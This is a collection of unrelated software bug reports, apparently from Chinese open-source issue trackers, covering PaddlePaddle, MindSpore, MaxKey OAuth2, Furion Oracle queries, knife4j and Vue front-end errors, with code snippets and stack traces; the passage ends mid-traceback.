fluid.io.PyReader单机多卡下出现ValueError,"paddle 版本 1.5.0 cuda 9.0 cudnn 7.0 使用io.Pyreader 在单机多卡情况下出现错误 报错如下   <code>: export CUDA_VISIBLE_DEVICES=4,5 export FLAGS_enable_parallel_graph=1 export FLAGS_sync_nccl_allreduce=1 export FLAGS_fraction_of_gpu_memory_to_use=0.1 export FLAGS_eager_delete_tensor_gb=0.0 export FLAGS_fast_eager_deletion_mode=1 place = fluid.CUDAPlace(0) train_reader = fluid.io.PyReader( feed_list=[ instance.input_src_ids, instance.input_txt_ids, instance.input_pos_ids, instance.input_mask, instance.input_image, instance.input_soft_label], capacity=10, iterable=True) train_reader.decorate_batch_generator(dev_batch_gen, places=place) Traceback (most recent call last): File ""distill_ernie_asyn.py"", line 348, in &lt;module&gt; train() File ""distill_ernie_asyn.py"", line 241, in train fetch_list=[train_loss.name]) File ""/home/work/lixiaokang04/tools/paddle_release_home/python/lib/python2.7/site-packages/paddle/fluid/parallel_executor.py"", line 280, in run return_numpy=return_numpy) File ""/home/work/lixiaokang04/tools/paddle_release_home/python/lib/python2.7/site-packages/paddle/fluid/executor.py"", line 666, in run return_numpy=return_numpy) File ""/home/work/lixiaokang04/tools/paddle_release_home/python/lib/python2.7/site-packages/paddle/fluid/executor.py"", line 508, in _run_parallel ""Feed a list of tensor, the list should be the same size as places"" ValueError: Feed a list of tensor, the list should be the same size as places"
BUG反馈，通过oauth2 password方式，后续接口使用异常,这次版本提交有BUG commitid:06b27d356499041dc54835835b43bac1884fc62c Authentication 优化 Crystal.Sea 2020/11/8 13:05 bug复现通过MaxkeyPasswordApi20方式获取token，然后调用/api/oauth/v20/me查询信息，会出现500异常。异常情况附上，初步分析是在06b27d356499041dc54835835b43bac1884fc62c 这次提交时候对Authentication进行了优化，但是password方式并未处理，导致获取Authentication出现类转换异常 异常情况:   <code>: java.lang.ClassCastException: org.springframework.security.core.userdetails.User cannot be cast to org.maxkey.authn.SigninPrincipal at org.maxkey.authz.oauth2.provider.userinfo.endpoint.UserInfoEndpoint.apiV20UserInfo(UserInfoEndpoint.java:105) ~[classes/:na] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_111] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_111] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_111] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_111] at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:197) ~[spring-web-5.3.1.jar:5.3.1] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:141) ~[spring-web-5.3.1.jar:5.3.1] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) ~[spring-webmvc-5.3.1.jar:5.3.1] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:893) ~[spring-webmvc-5.3.1.jar:5.3.1] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:807) ~[spring-webmvc-5.3.1.jar:5.3.1] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-5.3.1.jar:5.3.1] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1061) ~[spring-webmvc-5.3.1.jar:5.3.1] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:961) ~[spring-webmvc-5.3.1.jar:5.3.1] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) ~[spring-webmvc-5.3.1.jar:5.3.1] at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898) ~[spring-webmvc-5.3.1.jar:5.3.1] at javax.servlet.http.HttpServlet.service(HttpServlet.java:626) ~[tomcat-embed-core-9.0.39.jar:4.0.FR] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) ~[spring-webmvc-5.3.1.jar:5.3.1] at javax.servlet.http.HttpServlet.service(HttpServlet.java:733) ~[tomcat-embed-core-9.0.39.jar:4.0.FR] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) ~[tomcat-embed-core-9.0.39.jar:9.0.39] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) ~[tomcat-embed-core-9.0.39.jar:9.0.39] at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) ~[tomcat-embed-websocket-9.0.39.jar:9.0.39] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) ~[tomcat-embed-core-9.0.39.jar:9.0.39] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) ~[tomcat-embed-core-9.0.39.jar:9.0.39] at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:149) ~[spring-security-web-5.4.1.jar:5.4.1] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) ~[tomcat-embed-core-9.0.39.jar:9.0.39] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) ~[tomcat-embed-core-9.0.39.jar:9.0.39] at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:123) ~[druid-1.1.10.jar:1.1.10] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) ~[tomcat-embed-core-9.0.39.jar:9.0.39] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) ~[tomcat-embed-core-9.0.39.jar:9.0.39] at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:149) ~[spring-security-web-5.4.1.jar:5.4.1] at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:358) ~[spring-web-5.3.1.jar:5.3.1] at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:271) ~[spring-web-5.3.1.jar:5.3.1] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) ~[tomcat-embed-core-9.0.39.jar:9.0.39] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) ~[tomcat-embed-core-9.0.39.jar:9.0.39] at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-5.3.1.jar:5.3.1] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.1.jar:5.3.1] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) ~[tomcat-embed-core-9.0.39.jar:9.0.39] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) ~[tomcat-embed-core-9.0.39.jar:9.0.39] at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-5.3.1.jar:5.3.1] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.1.jar:5.3.1] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) ~[tomcat-embed-core-9.0.39.jar:9.0.39] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) ~[tomcat-embed-core-9.0.39.jar:9.0.39] at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:93) ~[spring-boot-actuator-2.4.0.jar:2.4.0] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.1.jar:5.3.1] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) ~[tomcat-embed-core-9.0.39.jar:9.0.39] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) ~[tomcat-embed-core-9.0.39.jar:9.0.39] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.3.1.jar:5.3.1] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.1.jar:5.3.1] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) ~[tomcat-embed-core-9.0.39.jar:9.0.39] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) ~[tomcat-embed-core-9.0.39.jar:9.0.39] at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) ~[tomcat-embed-core-9.0.39.jar:9.0.39] at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) [tomcat-embed-core-9.0.39.jar:9.0.39] at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) [tomcat-embed-core-9.0.39.jar:9.0.39] at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) [tomcat-embed-core-9.0.39.jar:9.0.39] at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) [tomcat-embed-core-9.0.39.jar:9.0.39] at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) [tomcat-embed-core-9.0.39.jar:9.0.39] at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343) [tomcat-embed-core-9.0.39.jar:9.0.39] at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) [tomcat-embed-core-9.0.39.jar:9.0.39] at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.39.jar:9.0.39] at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868) [tomcat-embed-core-9.0.39.jar:9.0.39] at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590) [tomcat-embed-core-9.0.39.jar:9.0.39] at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.39.jar:9.0.39] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) [na:1.8.0_111] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) [na:1.8.0_111] at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.39.jar:9.0.39] at java.lang.Thread.run(Thread.java:745) [na:1.8.0_111]
Oracle 不能指定版本 导致 ORA-00933:SQL命令未正确结束,"Furion 版本号 1.17.1 Web 项目类型 WebApi Mvc Razor Pages Blazor Server 生成的SQL语句： Oracle.ManagedDataAccess.Client.OracleException (0x80004005): ORA-00933: SQL 命令未正确结束 at OracleInternal.ServiceObjects.OracleConnectionImpl.VerifyExecution(Int32&amp; cursorId, Boolean bThrowArrayBindRelatedErrors, SqlStatementType sqlStatementType, Int32 arrayBindCount, OracleException&amp; exceptionForArrayBindDML, Boolean&amp; hasMoreRowsInDB, Boolean bFirstIterationDone) at OracleInternal.ServiceObjects.OracleCommandImpl.VerifyExecution(OracleConnectionImpl connectionImpl, Int32&amp; cursorId, Boolean bThrowArrayBindRelatedErrors, OracleException&amp; exceptionForArrayBindDML, Boolean&amp; hasMoreRowsInDB, Boolean bFirstIterationDone) at OracleInternal.ServiceObjects.OracleCommandImpl.ExecuteReader(String commandText, OracleParameterCollection paramColl, CommandType commandType, OracleConnectionImpl connectionImpl, OracleDataReaderImpl&amp; rdrImpl, Int32 longFetchSize, Int64 clientInitialLOBFS, OracleDependencyImpl orclDependencyImpl, Int64[] scnForExecution, Int64[]&amp; scnFromExecution, OracleParameterCollection&amp; bindByPositionParamColl, Boolean&amp; bBindParamPresent, Int64&amp; internalInitialLOBFS, Int64 internalInitialJSONFS, OracleException&amp; exceptionForArrayBindDML, OracleConnection connection, OracleLogicalTransaction&amp; oracleLogicalTransaction, IEnumerable`1 adrianParsedStmt, Boolean isDescribeOnly, Boolean isFromEF) at Oracle.ManagedDataAccess.Client.OracleCommand.ExecuteReader(Boolean requery, Boolean fillRequest, CommandBehavior behavior) at Oracle.ManagedDataAccess.Client.OracleCommand.ExecuteDbDataReader(CommandBehavior behavior) at System.Data.Common.DbCommand.ExecuteDbDataReaderAsync(CommandBehavior behavior, CancellationToken cancellationToken) 代码或代码仓库 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos 通过类似 UseOracleSQLCompatibility方法，向配置中传递11指的是Oracle11g版本，如果是12g版本，传递12 或者像Mysql一样   <code>: var file = await _repository.DetachedEntities.FirstOrDefaultAsync(x =&gt; x.Id == fileId); SELECT ""l"".""FILEID"", ""l"".""CREATETIME"", ""l"".""CREATEUSERID"", ""l"".""CREATEUSERNAME"", ""l"".""DELETEMARK"", ""l"".""EQUIID"", ""l"".""FILEEXTENSIONS"", ""l"".""FILENAME"", ""l"".""FILEPATH"", ""l"".""FILESIZE"", ""l"".""FILETYPE"", ""l"".""PARENTID"" FROM ""EQUI_FILEINFO"" ""l"" WHERE ""l"".""FILEID"" = 'ab20b357-4760-44c9-9446-cd5a89242709' FETCH FIRST 1 ROWS ONLY services.AddDbContextPool&lt;DefaultDbContext&gt;(options =&gt; { options.UseOracle(GetConnectionString(configuration, DatabaseType.Oracle),b=&gt;b.UseOracleSQLCompatibility(""11"")) }, poolSize: 64);"
JsTicket 缓存,"正常情况下，jsapi_ticket的有效期为7200秒，通过access_token来获取。由于获取jsapi_ticket的api调用次数非常有限，频繁刷新jsapi_ticket会导致api调用受限，影响自身业务，开发者必须在自己的服务全局缓存jsapi_ticket 。   <code>: public class JsTicket { private String ticket; // 正确获取到 ticket 时有值 private Integer expires_in; // 正确获取到 access_token 时有值 private Integer errcode; // 出错时有值 private String errmsg; // 出错时有值 private Long expiredTime; // 正确获取到 ticket 时有值，存放过期时间 private String json; public JsTicket(String jsonStr) { this.json = jsonStr; try { @SuppressWarnings(""rawtypes"") Map map = new ObjectMapper().readValue(jsonStr, Map.class); ticket = (String)map.get(""ticket""); expires_in = (Integer)map.get(""expires_in""); errcode = (Integer)map.get(""errcode""); errmsg = (String)map.get(""errmsg""); if (expires_in != null) expiredTime = System.currentTimeMillis() + ((expires_in -5) * 1000); } catch (Exception e) { throw new RuntimeException(e); } } public String getJson() { return json; } public boolean isAvailable() { if (expiredTime == null) return false; if (errcode != null) return false; if (expiredTime &lt; System.currentTimeMillis()) return false; return ticket != null; } public String getTicket() { return ticket; } public Integer getExpiresIn() { return expires_in; } public Integer getErrorCode() { return errcode; } public String getErrorMsg() { if (errcode != null) { String result = ReturnCode.get(errcode); if (result != null) return result; } return errmsg; } /** * APi 请求是否成功返回 */ public boolean isSucceed() { Integer errorCode = getErrorCode(); // errorCode 为 0 时也可以表示为成功，详见：http://mp.weixin.qq.com/wiki/index.php?title=%E5%85%A8%E5%B1%80%E8%BF%94%E5%9B%9E%E7%A0%81%E8%AF%B4%E6%98%8E return (errorCode == null || errorCode == 0); } }"
refine CMakeLists for document,"由于合并中英文目录到doc/后，会有index_en.rst和index_cn.rst。而sphinx编译时，必须有名字为index.rst或index.md的文件。因此在sphinx编译前复制index_en/cn.rst为index.rst，编译后删除复制出的index.rst，能生成两颗目录树。 将doc_cn目录合并到doc后，只需修改如下，就能在一个doc目录下，生成两颗目录树。：   <code>: doc/CMakeLists.txt set(BINARY_BUILD_DIR_EN ""${CMAKE_CURRENT_BINARY_DIR}/en/_build"") set(SPHINX_CACHE_DIR_EN ""${CMAKE_CURRENT_BINARY_DIR}/en/_doctrees"") set(SPHINX_HTML_DIR_EN ""${CMAKE_CURRENT_BINARY_DIR}/en/html"") set(INDEX_NAME_EN ""index_en.rst"") configure_file( ""${CMAKE_CURRENT_SOURCE_DIR}/conf.py.in"" ""${BINARY_BUILD_DIR_EN}/conf.py"" @ONLY) sphinx_add_target(paddle_docs html ${BINARY_BUILD_DIR_EN} ${SPHINX_CACHE_DIR_EN} ${CMAKE_CURRENT_SOURCE_DIR} ${SPHINX_HTML_DIR_EN} ${INDEX_NAME_EN}) add_dependencies(paddle_docs gen_proto_py) ----------------------------------------------------- set(BINARY_BUILD_DIR_CN ""${CMAKE_CURRENT_BINARY_DIR}/cn/_build"") set(SPHINX_CACHE_DIR_CN ""${CMAKE_CURRENT_BINARY_DIR}/cn/_doctrees"") set(SPHINX_HTML_DIR_CN ""${CMAKE_CURRENT_BINARY_DIR}/cn/html"") set(INDEX_NAME_CN ""index_cn.rst"") configure_file( ""${CMAKE_CURRENT_SOURCE_DIR}/conf.py.in"" ""${BINARY_BUILD_DIR_CN}/conf.py"" @ONLY) sphinx_add_target(paddle_docs_cn html ${BINARY_BUILD_DIR_CN} ${SPHINX_CACHE_DIR_CN} ${CMAKE_CURRENT_SOURCE_DIR} ${SPHINX_HTML_DIR_CN} ${INDEX_NAME_CN}) add_dependencies(paddle_docs_cn gen_proto_py)"
"属性定义是泛型T,返回类型指定泛型类型,但是响应参数还是显示Object","属性定义是泛型T,返回类型指定泛型类型,但是响应参数还是显示Object pom.xml application.yml文件 controller层 SwaggerConfig类 result结果集 <ol start=""5""> knife4j视图   <code>: &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;version&gt;2.2.2.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.0.8&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; server: port: 80 swagger: show: true knife4j: enable: true setting: enableFooter: false enableFooterCustom: true footerCustomContent: Apache License 2.0 | Copyright 2019-[浙江八一菜刀研究基地](https://gitee.com/xiaoym/knife4j) @PostMapping(""/insert"") @ApiOperation(""添加数据"") @ApiOperationSupport(ignoreParameters = {""uptModel.id"", ""uptModel.order.id""}) public Result&lt;UptModel&gt; insert(@RequestBody UptModel uptModel) { return new Result&lt;&gt;(200, ""添加成功"", uptModel); } package com.example.config; import com.github.xiaoymin.knife4j.spring.extension.OpenApiExtensionResolver; import org.springframework.beans.factory.annotation.Value; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import springfox.documentation.builders.ApiInfoBuilder; import springfox.documentation.builders.PathSelectors; import springfox.documentation.builders.RequestHandlerSelectors; import springfox.documentation.service.ApiInfo; import springfox.documentation.service.Contact; import springfox.documentation.spi.DocumentationType; import springfox.documentation.spring.web.plugins.Docket; import springfox.documentation.swagger2.annotations.EnableSwagger2WebMvc; @Configuration @EnableSwagger2WebMvc public class SwaggerConfig { @Value(""${swagger.show}"") private boolean swaggerShow; private final OpenApiExtensionResolver openApiExtensionResolver; public SwaggerConfig(OpenApiExtensionResolver openApiExtensionResolver) { this.openApiExtensionResolver = openApiExtensionResolver; } @Bean //配置了Swagger的Docket的bean实例 public Docket docket() { return new Docket(DocumentationType.SWAGGER_2) .apiInfo(apiInfo()) .enable(swaggerShow) // 分组名称 .groupName(""A"") .select() // 扫描包的路径 .apis(RequestHandlerSelectors.basePackage(""com.example.controller"")) .paths(PathSelectors.any()) //paths()过滤扫描路径 //.paths(PathSelectors.ant(""/test/**"")) .build() .extensions(openApiExtensionResolver.buildSettingExtensions()); } @Bean public Docket Docket2() { return new Docket(DocumentationType.SWAGGER_2).groupName(""B"").enable(swaggerShow); } //配置Swagger信息=apiInfo private ApiInfo apiInfo() { //作者信息 return new ApiInfoBuilder() .title(""Swagger3接口文档"") .description(""即使再小的帆也能远航"") .termsOfServiceUrl(""http://f1dao.com"") .contact(new Contact(""f1dao"", ""http://gitee.com/f1dao"", ""final1dao@qq.com"")) .version(""1.0"") .build(); } } package com.example.utils; import io.swagger.annotations.ApiModel; import io.swagger.annotations.ApiModelProperty; @ApiModel(value = ""Result对象"") public class Result&lt;T&gt; { @ApiModelProperty(value = ""响应码"") private Integer code; @ApiModelProperty(value = ""响应消息"") private String msg; @ApiModelProperty(value = ""响应数据"") private T data; public Result() { super(); } public Result(Integer code, String msg, T data) { this.code = code; this.msg = msg; this.data = data; } public Integer getCode() { return code; } public void setCode(Integer code) { this.code = code; } public String getMsg() { return msg; } public void setMsg(String msg) { this.msg = msg; } public T getData() { return data; } public void setData(T data) { this.data = data; } @Override public String toString() { return ""Result{"" + ""code="" + code + "", msg='"" + msg + '\'' + "", data="" + data + '}'; } }"
thor优化器里的一个小的错误,"a bug in thor optimizer THOR优化器在使用Cholesky分解来计算矩阵逆时，有一个地方的算子配置错误。 背景相关：Cholesky分解与矩阵求逆 Cholesky分解对于对称正定矩阵A，将其分解为$A=L L^T$。mindspore中对应的算子为，算子返回的值为$(L^T)^{-1}$,记为a。因此计算矩阵$A$的逆为： $$\begin{aligned} A^{-1} &amp;= (L^T)^{-1}L^{-1} \\ &amp;= (L^T)^{-1} ((L^T)^T)^{-1} \\ &amp;= (L^T)^{-1} ((L^T)^{-1})^T \\ &amp;= a a^T \end{aligned} $$ 因此，在计算矩阵A的逆时，应该对b进行transpose操作。 / 硬件环境: /device ascend : -- MindSpore version (1.5.0) : -- Python version (Python 3.7.5) : -- OS platform and distribution (Linux Ubuntu 18.04): -- GCC/Compiler version : (/): /mode graph python cholesky_test.py =&gt; cholesky矩阵求逆结果跟numpy不一致 打开这行注释： python cholesky_test.py =&gt; cholesky矩阵求逆结果跟numpy一致 输入一个正定对称矩阵，采用cholesky矩阵求逆结果跟numpy应该一致。   <code>: # 原始代码 self.tbe_batch_matmul = P.BatchMatMul(transpose_a=True) # 应该修改为 self.tbe_batch_matmul = P.BatchMatMul(transpose_b=True) ms.ops.operations.CusCholeskyTrsm # filename： cholesky_test.py import mindspore as ms import numpy as np import time np.random.seed(666) N = 128 mat = np.random.random((N, N)) mat = mat.T@mat matrix = ms.Tensor(mat, ms.float32) def test_numpy(): matrix_float = matrix.asnumpy().astype(np.float32) matrix_inv = np.linalg.inv(matrix_float) print(""====================== numpy ==============================="") print(matrix_inv[0,:30]) print(f""original matrix: {matrix[0,:30]}"") def test_matrix_inv_cholesky(): cholesky = ms.ops.operations.CusCholeskyTrsm() matrix_combine = ms.ops.operations.CusMatrixCombine() # 调用这个算子没问题，内置了transpose cusbmm = ms.ops.operations.CusBatchMatMul() # 官方代码，transpose_a=True，得到错误的结果（与numpy结果对比） bmm = ms.ops.BatchMatMul(transpose_a=True) # 对b进行transpose就能得到与numpy接近的结果 # bmm = ms.ops.BatchMatMul(transpose_b=True) matrix_cholesky = cholesky(matrix) matrix_inv = cusbmm(matrix_cholesky, matrix_cholesky) matrix_inv = matrix_combine(matrix_inv) t0 = time.time() matrix_cholesky = cholesky(matrix) matrix_inv = cusbmm(matrix_cholesky, matrix_cholesky) matrix_inv = matrix_combine(matrix_inv) print(f""Cholesky Time cost: {time.time()-t0}"") mat_inv_arr = matrix_inv.asnumpy() print(""====================== cholesky ============================="") print(mat_inv_arr[0, :30]) if __name__ == '__main__': test_matrix_inv_cholesky() test_numpy() # bmm = ms.ops.BatchMatMul(transpose_b=True)"
What is the difference between PROJ_ROOT and CMAKE_SOURCE_DIR,"I noticed that in , there defines Does this mean that is exactly ?   <code>: /CMakeLists.txt set(PROJ_ROOT ${CMAKE_CURRENT_SOURCE_DIR}) PROJ_ROOT CMAKE_SOURCE_DIR"
写模型到本地目录的时候崩溃,"一轮训练完成之后，写入文件，崩溃，代码是： 错误日志是： 用的DSSM模型，字典维度200w   <code>: with gzip.open(""dssm_%s_pass_%05d.tar.gz"" % (model_save_name_prefix, event.pass_id), ""w"") as f: parameters.to_tar(f) [INFO 2017-07-13 15:26:48,320 train.py:199] Pass 0, Batch 4000, Cost 0.530298, {'__auc_evaluator_0__': 0.7309514880180359, 'classification_error_evaluator': 0.2705000042915344} (paddle_box) (paddle_box) tail log.bigram num_passes=num_passes) File ""/home/yanchunwei/third_party/paddle_env/python27/lib/python2.7/site-packages/paddle/v2/trainer.py"", line 175, in train event_handler(v2_event.EndPass(pass_id, evaluator=pass_evaluator)) File ""train.py"", line 211, in _event_handler parameters.to_tar(f) File ""/home/yanchunwei/third_party/paddle_env/python27/lib/python2.7/site-packages/paddle/v2/parameters.py"", line 274, in to_tar self.serialize(nm, buf) File ""/home/yanchunwei/third_party/paddle_env/python27/lib/python2.7/site-packages/paddle/v2/parameters.py"", line 256, in serialize f.write(param.tostring()) OverflowError: length too large"
3.7.0的job前端报js错误,"环境信息 pigx版本: 3.7.0 是否修改包名: 没有 控制台日志为: [Vue warn]: Invalid prop: type check failed for prop ""total"". Expected Number with value 0, got String with value ""0"". found in ---&gt; at packages/card/src/main.vue at src/components/basic-container/main.vue at src/views/daemon/job-manage/index.vue at src/page/index/index.vue at src/App.vue 回显步骤:   <code>: 直接点开系统管理-Quartz管理就报错"
行单机、双击回调参数有问题！,"这是 的代码片段 element-ui/crud/index.vue AVUE-CRUD 文档 文档与代码不符， 真实只有两个回调参，漏了column，element-table#table-events里面这里是有三个回调参数的，同时这里获取 三个回调参数的顺序也错了。   <code>: 2.8.13 // 行双击 rowDblclick (row, event) { this.$emit(""row-dblclick"", row, event); }, // 行单机 rowClick (row, event, column) { this.$emit(""row-click"", row, event, column); }, row-dblclick element-table row-dblclick"
训练完一轮后，如何释放显存开始下一轮,"环境：paddle 2.0.2 语言：python 3.7 问题： 使用不同权重的组合损失依次训练模型，请问如何在每一轮训练完成后释放显存。 完成一轮训练后，显存并没有释放，导致第二轮训练时，GPU out of memory。 请问怎么在训练完成后释放显存。谢谢您的解答！   <code>: （eg： Loss = loss1+alpha*loss2），alpha=[0.1, 0.2, 0.3] 示例： for a in alpha // (1) a=0.1; (2) a=0.2； （3）a=0.3 net = model(); for epoch in range(10): loss = net(input); loss.backward //完成一轮，保存参数 net.save_dict();"
训练时候loss函数似乎不支持batch_size维度的变化,"环境 mindspore 1.8.1 cpu&amp;npu 复现代码 正常训练，训练step &gt;= 3 实际情况 第二个step就失败了，会报错 补充说明 这里的 [696, 211] [694, 211]的shape分别是第一个step的loss函数输入tensor的shape，和第二个step的loss函数输入tensor的shape   <code>: from mindspore import nn, dataset as ds, ops, Parameter, Tensor, context from mindspore.nn.loss import SoftmaxCrossEntropyWithLogits context.set_context(mode=context.PYNATIVE_MODE, device_id=2) class Net(nn.Cell): def __init__(self): super().__init__() self.loss_fn = SoftmaxCrossEntropyWithLogits(sparse=True, reduction='mean') self.weight = Parameter(Tensor(1.0)) self.greater = ops.Greater() def construct(self, data, labels): logits = data * self.weight active_loss = self.greater(labels.reshape((-1,)), 0) old_shape = logits.shape logits_mask = ops.tile(ops.expand_dims(active_loss, -1), (1, 211)) reduced_logits = ops.masked_select(logits.reshape((-1, logits.shape[-1])), logits_mask) print(reduced_logits.shape, ops.shape(reduced_logits)) reduced_logits = reduced_logits.reshape((-1, old_shape[-1])) reduced_logits = reduced_logits.reshape(reduced_logits.shape) labels = ops.masked_select(labels.reshape((-1,)), active_loss) print(labels.shape, ops.shape(labels)) labels = labels.reshape(labels.shape) reduced_logits = reduced_logits.astype('float32') return self.loss_fn(reduced_logits, labels) net = Net() batch_size = 8 num = 1000 np_x_data = np.random.randn(num, 128, 211).astype('float32') np_y_data = np.random.randint(-100, 211, (num, 128)).astype('int32') dataset = ds.NumpySlicesDataset((np_x_data, np_y_data), column_names=['x', 'y']) dataset = dataset.batch(batch_size) optimizer = nn.Adam(net.trainable_params()) train_net = nn.TrainOneStepCell(net, optimizer) train_net.set_train() for data in dataset: loss = train_net(*data) print(loss) File ""/home/wangyixian/.pyenv/versions/tf2.x/lib/python3.7/site-packages/mindspore/ops/composite/base.py"", line 409, in after_grad out = _pynative_executor(fn, grad_.sens_param, *args, **kwargs) File ""/home/wangyixian/.pyenv/versions/tf2.x/lib/python3.7/site-packages/mindspore/common/api.py"", line 1001, in __call__ return self._executor(sens_param, obj, args) RuntimeError: Single op compile failed, op: softmax_cross_entropy_with_logits_13058719345202181201_2 except_msg: 2022-09-01 11:07:12.380032+00:00: Query except_msg:Traceback (most recent call last): File ""/home/wangyixian/.pyenv/versions/tf2.x/lib/python3.7/site-packages/te_fusion/parallel_compilation.py"", line 1489, in run relation_param=self._relation_param) File ""/home/wangyixian/.pyenv/versions/tf2.x/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1277, in build_single_op compile_info = call_op() File ""/home/wangyixian/.pyenv/versions/tf2.x/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1264, in call_op opfunc(*inputs, *outputs, *new_attrs, **kwargs) File ""/home/wangyixian/.pyenv/versions/tf2.x/lib/python3.7/site-packages/tbe/common/utils/para_check.py"", line 547, in _in_wrapper return func(*args, **kwargs) File ""/home/wangyixian/Ascend/ascend-toolkit/latest/opp/op_impl/built-in/ai_core/tbe/impl/softmax_cross_entropy_with_logits.py"", line 493, in softmax_cross_entropy_with_logits impl_mode) File ""/home/wangyixian/.pyenv/versions/tf2.x/lib/python3.7/site-packages/tbe/common/register/operation_func_mgr.py"", line 61, in wrapper return func(*args, **kwargs) File ""/home/wangyixian/Ascend/ascend-toolkit/latest/opp/op_impl/built-in/ai_core/tbe/impl/softmax_cross_entropy_with_logits.py"", line 219, in 